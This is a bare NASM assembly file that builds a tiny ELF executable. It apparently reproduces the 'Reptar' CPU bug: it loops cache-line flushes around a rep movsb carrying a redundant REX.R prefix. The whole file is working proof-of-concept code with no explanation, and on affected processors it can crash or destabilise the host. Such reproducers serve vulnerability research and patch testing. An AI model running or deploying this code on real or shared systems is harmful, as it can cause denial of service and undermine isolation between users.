bits 64
            org 0x7ffff7ff8000

ehdr:                                           ; Elf64_Ehdr
            db  0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
    times 8 db  0
            dw  2                               ;   e_type
            dw  62                              ;   e_machine
            dd  1                               ;   e_version
            dq  _start                          ;   e_entry
            dq  text_phdr - $$                  ;   e_phoff
            dq  0                               ;   e_shoff
            dd  0                               ;   e_flags
            dw  ehdrsize                        ;   e_ehsize
            dw  phdrsize                        ;   e_phentsize
            dw  1                               ;   e_phnum
            dw  0                               ;   e_shentsize
            dw  0                               ;   e_shnum
            dw  0                               ;   e_shstrndx

ehdrsize    equ $ - ehdr

text_phdr:                                      ; Elf64_Phdr
            dd  1                               ;   p_type
            dd  5                               ;   p_flags
            dq  0                               ;   p_offset
            dq  $$                              ;   p_vaddr
            dq  $$                              ;   p_paddr
            dq  textsize                        ;   p_filesz
            dq  textsize                        ;   p_memsz
            dq  0x1000                          ;   p_align

phdrsize    equ     $ - text_phdr

_start:
    mov cl, 7
    lea rax, [rsp - 0x1000]
    lea r8, [.after_reptar - .loop_only_on_bug]
    mov r10, 0x00007ffff7ffda40 ; after time
    xor rbx, rbx
    mov rdx, .end_of_program
    lea r13, [rsp-0x4000]
    mov r15, .skip_reptar_alias
    mov r11, .loop_only_on_bug
    push rdx
    xor rdx, rdx
    .loop_for_every_iteration:
        .loop_only_on_bug:
            clflush [rax]
            clflush [rax+64]
            mov rsi, rax
            mov rdi, rax
            mov cl, 1
            inc rdx
            mov r9, rdx
            sub r9, rbx
            imul r9, r8
            add r9, r11
            cmp r9, r10 ; we are past vdso
            cmova r12, r13 ; this will PF but recover
            cmova rax, rcx ; this will break/PF the clflush
            cmovna r12, rsp ; ths wont PF
            clflush [r12]
            clflush [rax]

            .reptar:
                rep
                db 0x44; rex.r
                movsb
            .after_reptar:
                rep
                times 64 nop
                jmp r15

            .reptar_alias:
                nop
                nop
                nop
            .after_reptar_alias:
                times 100 nop
                ; kill
                mov eax, 0
                mov ebx, 0
                int 0x80

            .skip_reptar_alias:
                inc rbx
                jmp .loop_for_every_iteration
            .end_of_program:
                int3
                int3
textsize      equ     $ - $$